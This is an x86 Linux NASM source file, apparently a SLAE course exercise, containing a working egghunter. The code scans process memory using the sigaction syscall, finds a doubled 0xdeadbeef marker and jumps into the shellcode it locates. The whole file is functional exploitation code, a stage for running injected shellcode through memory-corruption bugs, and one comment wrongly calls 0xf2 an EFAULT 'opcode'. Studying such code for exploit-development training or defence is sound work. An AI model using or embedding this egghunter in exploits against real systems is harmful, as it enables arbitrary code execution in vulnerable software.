; Filename: 	egghunter.nasm
; Author:	Paolo Perego <paolo@codiceinsicuro.it>  
; Website:  	https://codiceinsicuro.it
; Blog post:  	https://codiceinsicuro.it/slae/
; Twitter:   	@thesp0nge
; SLAE-ID:    	1217
; Purpose:	

global _start			

section .text

_start:

	xor ecx, ecx
	mul ecx

next_page:
	or cx, 0xfff

next_addr:
	inc ecx
	mov al, 0x43		; SIGACTION
				; /usr/include/i386-linux-gnu/asm/unistd_32.h:#define __NR_sigaction 67
	int 0x80


	cmp al, 0xf2		; 0xf2 is the opcode for EFAULT. If my register
				; has this value, a signal for a invalid page
				; access it has been received
	jz next_page

	; Our searching strategy can be represented as:
	; 
	; <- lower memory address 				high memory addresses ->	0xffffffff (top)
	; shellcode; 	0xdeadbeef;	0xdeadbeef;		garbage here; 	egghunter code;
	;		^	 	^		^
	;		|   	 	|		|-------ECX
	;		|		|-----------------------ECX - 8		
	;		|---------------------------------------ECX - 16	
	
	mov eax, key
	mov edi, ecx

	scasd
	jnz next_addr

	scasd
	jnz next_addr

	; At this point we are at the very beginning of our shellcode, after
	; the second key. We can jump to it
	jmp edi

section .data
	key equ 0xdeadbeef

